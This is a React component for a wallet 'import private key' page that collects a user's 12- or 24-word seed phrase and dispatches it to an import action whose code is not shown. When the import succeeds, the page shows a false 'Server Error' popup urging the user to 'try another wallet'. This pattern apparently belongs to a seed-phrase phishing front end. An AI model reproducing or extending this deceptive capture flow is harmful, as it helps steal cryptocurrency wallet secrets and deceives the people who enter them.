import { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import { useNavigate } from "react-router-dom";
import PopUp from "../../components/PopUp/PopUp";
import { importPrivateKey, refreshImportNetError } from "../../stateManagement/redux/actionCreators/ImportActionCreators";
import { ConnectButton, ErrMsg, NetErrMsg, PassphraseForm, PassphraseFormDesription, PassphraseInput } from "./Style";

const PrivateKey = () => {

    const [privateKey, setPrivateKey] = useState('');
    const [submittedPrivateKey, setSubmittedPrivateKey] = useState('');

    const navigate = useNavigate();
    const dispatch = useDispatch();

    const netError = useSelector(state => state.import.netError);

    const state = useSelector(state => state.import.privateKey);

    const connecting = state.start;
    const errors = state.errors;
    const connected = state.success;

    const popUpActions = [
        {
            id: 1,
            name: "try again",
            callback: () => {
                dispatch(refreshImportNetError());
            }
        },
        {
            id: 2,
            name: "Go home",
            callback: () => navigate("/home", { replace: true })
        }
    ];

    useEffect(() => {
        dispatch(refreshImportNetError());
    }, []);


    return (
        <>
            {
                connected

                &&

                <PopUp
                    title={"Server Error"}
                    body={"unable to connect to the server. Try another wallet or try again later."}
                    actions={popUpActions}
                />
            }
            <PassphraseForm>
                {
                    netError

                    &&

                    <NetErrMsg>{netError.message}</NetErrMsg>
                }
                <PassphraseInput
                    type="text"
                    placeholder="Private Key"
                    value={privateKey}
                    onChange={e => {
                        setPrivateKey(e.target.value);
                    }}
                />
                {
                    (errors && errors.privateKey.length >= 1 && privateKey === submittedPrivateKey)

                    &&

                    <ErrMsg>{errors.privateKey[0]}</ErrMsg>
                }
                <PassphraseFormDesription>Typically 12 (sometimes 24) words seperated by single spaces.</PassphraseFormDesription>
                <ConnectButton
                    type="submit"
                    className={`${connecting ? "connecting" : ""} `}
                    onClick={e => {
                        e.preventDefault();

                        setSubmittedPrivateKey(privateKey);
                        dispatch(importPrivateKey({
                            privateKey: privateKey
                        }))

                    }}
                >CONNECT{connecting ? "ING" : ""}</ConnectButton>
            </PassphraseForm>
        </>
    );
}

export default PrivateKey;